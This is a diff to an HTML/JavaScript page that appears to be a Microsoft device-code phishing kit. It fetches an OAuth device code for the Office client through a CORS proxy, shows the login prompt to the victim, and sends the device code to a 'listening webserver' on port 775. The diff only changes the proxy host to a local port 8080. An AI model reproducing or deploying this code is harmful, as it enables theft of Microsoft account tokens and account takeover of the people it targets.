@@ -8,12 +8,12 @@
     </style>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <script>
-        // Redirect CORS using corsanywhere running on FLUX web3 :)
-        $.get("https://corsanywhere.app.runonflux.io/https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&resource=https://graph.windows.net").done(function(data) {
+		var host = window.location.protocol + "//" + window.location.host;
+		// Redirect CORS using corsanywhere running on FLUX web3 :)
+        $.get(host + ":8080" + "/https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&resource=https://graph.windows.net").done(function(data) {
             
             document.getElementById('code').innerHTML += data.message;
             // Change this line to point to your listening webserver
-		var host = window.location.protocol + "//" + window.location.host;
 		$.get(host + ":775" + "/?code=" + data.device_code);
             let message = data.message;
                 
